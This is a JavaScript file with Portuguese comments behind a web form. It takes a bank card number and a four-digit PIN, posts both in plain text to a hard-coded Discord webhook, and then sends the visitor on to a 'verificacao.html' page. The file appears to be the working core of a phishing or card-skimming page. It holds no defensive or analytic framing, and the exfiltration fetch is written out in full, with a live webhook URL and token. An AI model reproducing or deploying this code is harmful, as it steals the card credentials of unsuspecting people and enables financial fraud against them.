// Função para formatar o número do cartão
function formatarCartao(input) {
    let valor = input.value.replace(/\D/g, ''); // Remove caracteres não numéricos
    valor = valor.replace(/(\d{4})(?=\d)/g, '$1 '); // Adiciona espaços a cada 4 dígitos
    input.value = valor.substring(0, 19); // Limita a 19 caracteres
}

// Função para formatar a senha
function formatarSenha(input) {
    let valor = input.value.replace(/\D/g, ''); // Remove caracteres não numéricos
    input.value = valor.substring(0, 4); // Limita a 4 dígitos
}

// Função para enviar os dados para o Discord e redirecionar para verificacao.html
function enviarDados(event) {
    event.preventDefault(); // Previne o comportamento padrão de envio do formulário

    // Captura os dados do formulário
    const numeroCartao = document.getElementById('numero-cartao').value;
    const senhaCartao = document.getElementById('senha-cartao').value;

    // Envia os dados para o Discord via POST
    fetch('https://discord.com/api/webhooks/1317017089357385770/6Kc7n9lA1kk_A6mGrgaCrtmWk0ZmAP24L5xfJVzHrgIyxvcR7CdwHsc_NieKvAnBgKtP', {  // Substitua com o seu webhook do Discord
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: `Número do Cartão: ${numeroCartao}\nSenha: ${senhaCartao}`
        })
    })
    .then(response => {
        if (response.ok) {
            // Após o envio bem-sucedido, redireciona para verificacao.html
            window.location.href = 'verificacao.html';
        } else {
            alert('Erro ao enviar dados');
        }
    })
    .catch(error => {
        console.error('Erro:', error);
        alert('Erro ao enviar dados');
    });
}